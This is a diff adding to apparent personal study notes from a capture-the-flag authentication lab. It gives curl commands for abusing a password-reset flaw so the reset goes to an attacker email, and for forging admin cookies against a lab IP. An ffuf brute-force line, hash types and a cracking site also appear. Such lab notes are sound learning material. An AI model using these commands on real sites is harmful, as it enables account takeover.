@@ -12,3 +12,37 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 W1 = list of valid Usernames
 W2 = list of passwords to try in wordlists
 -fc = filter to use to check for HTTPS STATUS CODE
+
+*** LOGIC FLAW
+curl [url/reset link] -H 'Content-Type: application/x-www-form-urlencoded -d 'username=robert'
+
+
+// BYPASSING EMAIL RESET USING PHP $_REQUEST
+curl [url/reset link] -H 'Content-Type: application/x-www-form-urlencoded -d 'username=robert&email=attacker&hacker.com'
+
+// creating an account to target url
+curl [url/reset link] -H 'Content-type: application/x-www-form-urlencoded -d 'username=robert&email={username}@customer.acmeitsupport.thm'
+
+
+*** COOKIE TAMPERING
+EXAMPLE
+Set-Cookie: logged_in=true; Max-Age=3600; Path=/
+Set-Cookie: admin=false; Max-Age=3600; Path=/
+
+
+curl [cookieturl]
+
+curl -H "Cookie: logged_in=true, admin=false" http://10.10.59.148/cookie-test
+
+curl -H "Cookie: logged_in=true, admin=true" http://10.10.59.148/cookie-test
+
+** HASHING
+- md5
+- sha-256
+- sha-512
+- sha1
+
+helpful link for cracking: https://crackstation.net/
+
+** Encoding
+base64decode.org  = DECODING/ENCODING BASE64
